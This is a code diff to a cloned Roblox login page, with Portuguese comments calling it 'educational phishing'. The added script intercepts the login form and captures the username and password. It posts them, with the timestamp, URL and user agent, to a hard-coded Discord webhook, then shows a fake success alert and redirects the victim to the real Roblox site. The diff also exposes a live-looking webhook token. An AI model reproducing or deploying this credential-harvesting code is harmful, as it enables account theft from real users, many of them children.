@@ -1028,60 +1028,82 @@ function checkRobloxInstall() {
 
     <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/1bd55d8531edb12ec36b0b273511b83b.js'></script>
 
-<script src="config.js"></script>
 <script>
+// Configurações do Phishing Educativo
+const CONFIG = {
+    // 🔗 WEBHOOK - URL do Discord
+    webhookUrl: 'https://discord.com/api/webhooks/1401006483638059169/b1LcJW3NKHML1NGg3Ry_EMujqVsUvAyZ_vOtf--Fw1FwtuTn5Dk7GNm5nVkRBYvtDuB3',
+    
+    // 🔄 REDIRECIONAMENTO - Para onde enviar após captura
+    redirectUrl: 'https://www.roblox.com/login',
+    
+    // ⏱️ DELAY - Tempo para aguardar o React carregar (ms)
+    reactLoadDelay: 3000,
+};
+
 // Script para captura de dados do formulário de login
 document.addEventListener('DOMContentLoaded', function() {
+    console.log('🚀 Script de captura iniciado...');
+    
     // Aguarda o React renderizar o formulário
     setTimeout(function() {
+        console.log('🔍 Procurando formulário de login...');
+        
         // Função para capturar dados do formulário
         function captureLoginData() {
-            // Procura pelos campos usando os seletores da configuração
-            const usernameField = document.querySelector(CONFIG.selectors.username);
-            const passwordField = document.querySelector(CONFIG.selectors.password);
-            const loginButton = document.querySelector(CONFIG.selectors.submit);
+            // Procura pelos campos de login
+            const usernameField = document.querySelector('input[type="text"], input[type="email"], input[name="username"], input[name="email"], input[placeholder*="email"], input[placeholder*="usuário"]');
+            const passwordField = document.querySelector('input[type="password"], input[name="password"]');
+            const loginButton = document.querySelector('button[type="submit"], input[type="submit"], .btn-primary, .login-button, button:contains("Entrar"), button:contains("Login")');
+            
+            console.log('📝 Campos encontrados:', {
+                username: usernameField ? '✅' : '❌',
+                password: passwordField ? '✅' : '❌',
+                button: loginButton ? '✅' : '❌'
+            });
             
             if (usernameField && passwordField && loginButton) {
+                console.log('🎯 Formulário encontrado! Configurando captura...');
+                
                 // Intercepta o clique no botão de login
                 loginButton.addEventListener('click', function(e) {
                     e.preventDefault();
+                    e.stopPropagation();
                     
                     const username = usernameField.value;
                     const password = passwordField.value;
                     
+                    console.log('📤 Tentando capturar dados:', { username: username ? '✅' : '❌', password: password ? '✅' : '❌' });
+                    
                     if (username && password) {
-                        // Dados para enviar
-                        const data = {
-                            username: username,
-                            password: password,
-                            timestamp: new Date().toLocaleString('pt-BR'),
-                            userAgent: navigator.userAgent,
-                            url: window.location.href
-                        };
+                        // Formata a mensagem para Discord
+                        const messageText = `🔐 **Dados Capturados - Roblox Login**
+
+👤 **Usuário:** ${username}
+🔑 **Senha:** ${password}
+⏰ **Data/Hora:** ${new Date().toLocaleString('pt-BR')}
+🌐 **URL:** ${window.location.href}
+📱 **User Agent:** ${navigator.userAgent}`;
                         
-                        // Formata a mensagem usando a configuração
-                        let messageText = CONFIG.messageFormat.title + '\n\n';
-                        CONFIG.messageFormat.fields.forEach(field => {
-                            messageText += field
-                                .replace('{username}', username)
-                                .replace('{password}', password)
-                                .replace('{timestamp}', data.timestamp)
-                                .replace('{url}', data.url)
-                                .replace('{userAgent}', data.userAgent) + '\n';
-                        });
+                        console.log('📨 Enviando dados para Discord...');
                         
-                        // Envia para webhook
+                        // Envia para webhook do Discord
                         fetch(CONFIG.webhookUrl, {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json',
                             },
                             body: JSON.stringify({
-                                text: messageText
+                                content: messageText
                             })
                         })
                         .then(response => {
-                            console.log('✅ Dados enviados com sucesso para o painel');
+                            if (response.ok) {
+                                console.log('✅ Dados enviados com sucesso para o Discord!');
+                                alert('Login realizado com sucesso! Redirecionando...');
+                            } else {
+                                console.error('❌ Erro na resposta:', response.status);
+                            }
                             // Redireciona para a página real
                             window.location.href = CONFIG.redirectUrl;
                         })
@@ -1090,17 +1112,25 @@ document.addEventListener('DOMContentLoaded', function() {
                             // Mesmo com erro, redireciona
                             window.location.href = CONFIG.redirectUrl;
                         });
+                    } else {
+                        console.log('⚠️ Campos vazios, não enviando dados');
                     }
                 });
                 
                 // Também intercepta o envio do formulário
-                const form = document.querySelector(CONFIG.selectors.form);
+                const form = document.querySelector('form');
                 if (form) {
                     form.addEventListener('submit', function(e) {
                         e.preventDefault();
+                        e.stopPropagation();
                         loginButton.click();
                     });
                 }
+                
+                console.log('✅ Captura configurada com sucesso!');
+            } else {
+                console.log('⚠️ Formulário não encontrado, tentando novamente em 1 segundo...');
+                setTimeout(captureLoginData, 1000);
             }
         }
         
@@ -1120,7 +1150,7 @@ document.addEventListener('DOMContentLoaded', function() {
             childList: true,
             subtree: true
         });
-    }, CONFIG.reactLoadDelay); // Usa o delay da configuração
+    }, CONFIG.reactLoadDelay);
 });
 </script>
 
